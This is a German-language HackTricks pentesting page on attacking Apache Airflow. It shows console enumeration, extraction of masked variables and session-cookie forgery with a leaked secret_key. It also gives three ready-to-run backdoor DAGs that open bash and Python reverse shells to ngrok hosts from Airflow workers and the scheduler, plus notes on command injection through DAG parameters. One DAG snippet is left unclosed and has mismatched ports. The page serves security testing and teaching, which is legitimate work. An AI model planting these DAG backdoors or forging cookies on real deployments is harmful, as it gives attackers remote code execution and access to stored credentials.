# Apache Airflow Sicherheit

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

### Grundinformationen

[**Apache Airflow**](https://airflow.apache.org) dient als Plattform f√ºr **die Orchestrierung und Planung von Datenpipelines oder Workflows**. Der Begriff "Orchestrierung" im Kontext von Datenpipelines bezeichnet den Prozess der Anordnung, Koordination und Verwaltung komplexer Daten-Workflows, die aus verschiedenen Quellen stammen. Der Hauptzweck dieser orchestrierten Datenpipelines besteht darin, verarbeitete und konsumierbare Datens√§tze bereitzustellen. Diese Datens√§tze werden umfassend von einer Vielzahl von Anwendungen genutzt, einschlie√ülich, aber nicht beschr√§nkt auf Business-Intelligence-Tools, Datenwissenschafts- und Machine-Learning-Modelle, die alle grundlegend f√ºr das Funktionieren von Big-Data-Anwendungen sind.

Im Grunde wird Apache Airflow es dir erm√∂glichen, **die Ausf√ºhrung von Code zu planen, wenn etwas** (Ereignis, Cron) **passiert**.

### Lokales Labor

#### Docker-Compose

Du kannst die **docker-compose-Konfigurationsdatei von** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) verwenden, um eine vollst√§ndige Apache Airflow Docker-Umgebung zu starten. (Wenn du auf MacOS bist, stelle sicher, dass du der Docker-VM mindestens 6 GB RAM zuweist).

#### Minikube

Eine einfache M√∂glichkeit, **Apache Airflow** auszuf√ºhren, besteht darin, es **mit Minikube** zu betreiben:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow-Konfiguration

Airflow k√∂nnte **sensible Informationen** in seiner Konfiguration speichern oder Sie k√∂nnten schwache Konfigurationen finden:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

### Airflow RBAC

Bevor Sie mit dem Angriff auf Airflow beginnen, sollten Sie verstehen, **wie Berechtigungen funktionieren**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

### Angriffe

#### Webkonsole Enumeration

Wenn Sie **Zugriff auf die Webkonsole** haben, k√∂nnten Sie in der Lage sein, einige oder alle der folgenden Informationen zuzugreifen:

* **Variablen** (Benutzerdefinierte sensible Informationen k√∂nnten hier gespeichert werden)
* **Verbindungen** (Benutzerdefinierte sensible Informationen k√∂nnten hier gespeichert werden)
* Zugriff auf `http://<airflow>/connection/list/`
* [**Konfiguration**](./#airflow-configuration) (Sensible Informationen wie der **`secret_key`** und Passw√∂rter k√∂nnten hier gespeichert werden)
* Liste der **Benutzer & Rollen**
* **Code jedes DAG** (der interessante Informationen enthalten k√∂nnte)

#### Abrufen von Variablenwerten

Variablen k√∂nnen in Airflow gespeichert werden, damit die **DAGs** auf ihre Werte **zugreifen** k√∂nnen. Es ist √§hnlich wie bei Geheimnissen anderer Plattformen. Wenn Sie **genug Berechtigungen** haben, k√∂nnen Sie sie in der GUI unter `http://<airflow>/variable/list/` abrufen.\
Airflow zeigt standardm√§√üig den Wert der Variablen in der GUI an, jedoch ist es laut [**diesem**](https://marclamberti.com/blog/variables-with-apache-airflow/) m√∂glich, eine **Liste von Variablen** festzulegen, deren **Wert** in der **GUI** als **Sternchen** angezeigt wird.

![](<../../.gitbook/assets/image (164).png>)

Diese **Werte** k√∂nnen jedoch weiterhin √ºber **CLI** (Sie m√ºssen DB-Zugriff haben), **willk√ºrliche DAG**-Ausf√ºhrung, **API**-Zugriff auf den Variablen-Endpunkt (die API muss aktiviert sein) und **sogar die GUI selbst!**\
Um auf diese Werte √ºber die GUI zuzugreifen, w√§hlen Sie einfach die **Variablen** aus, auf die Sie zugreifen m√∂chten, und **klicken Sie auf Aktionen -> Exportieren**.\
Eine andere M√∂glichkeit besteht darin, einen **Bruteforce**-Angriff auf den **versteckten Wert** durchzuf√ºhren, indem Sie die **Suchfilterung** verwenden, bis Sie ihn erhalten:

![](<../../.gitbook/assets/image (152).png>)

#### Privilegieneskalation

Wenn die Konfiguration **`expose_config`** auf **True** gesetzt ist, k√∂nnen Benutzer ab der **Rolle Benutzer** und **dar√ºber** die **Konfiguration im Web** **lesen**. In dieser Konfiguration erscheint der **`secret_key`**, was bedeutet, dass jeder Benutzer mit diesem g√ºltigen Schl√ºssel **seinen eigenen signierten Cookie erstellen kann, um sich als ein anderer Benutzeraccount auszugeben**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG Backdoor (RCE in Airflow worker)

Wenn Sie **Schreibzugriff** auf den Ort haben, an dem die **DAGs gespeichert** sind, k√∂nnen Sie einfach **einen erstellen**, der Ihnen eine **Reverse Shell** sendet.\
Beachten Sie, dass diese Reverse Shell innerhalb eines **Airflow-Worker-Containers** ausgef√ºhrt wird:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG Backdoor (RCE im Airflow-Scheduler)

Wenn Sie etwas auf **der Wurzel des Codes ausf√ºhren** lassen, wird es zum Zeitpunkt des Schreibens **vom Scheduler ausgef√ºhrt**, nachdem es ein paar Sekunden lang im DAG-Ordner platziert wurde.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### DAG-Erstellung

Wenn es Ihnen gelingt, **eine Maschine im DAG-Cluster zu kompromittieren**, k√∂nnen Sie neue **DAG-Skripte** im `dags/`-Ordner erstellen, und sie werden **im Rest der Maschinen** im DAG-Cluster **repliziert**.

#### DAG-Code-Injection

Wenn Sie einen DAG √ºber die GUI ausf√ºhren, k√∂nnen Sie **Argumente** an ihn **√ºbergeben**.\
Daher k√∂nnte der DAG, wenn er nicht ordnungsgem√§√ü codiert ist, **anf√§llig f√ºr Command Injection sein.**\
Das ist, was in diesem CVE passiert ist: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Alles, was Sie wissen m√ºssen, um **nach Command Injections in DAGs zu suchen**, ist, dass **Parameter** mit dem Code **`dag_run.conf.get("param_name")`** **zugegriffen** werden.

Dar√ºber hinaus k√∂nnte die gleiche Verwundbarkeit auch bei **Variablen** auftreten (beachten Sie, dass Sie mit ausreichenden Berechtigungen **den Wert der Variablen** in der GUI **steuern** k√∂nnten). Variablen werden **zugegriffen mit**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Wenn sie beispielsweise innerhalb eines Bash-Befehls verwendet werden, k√∂nnten Sie eine Befehlsinjektion durchf√ºhren.

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
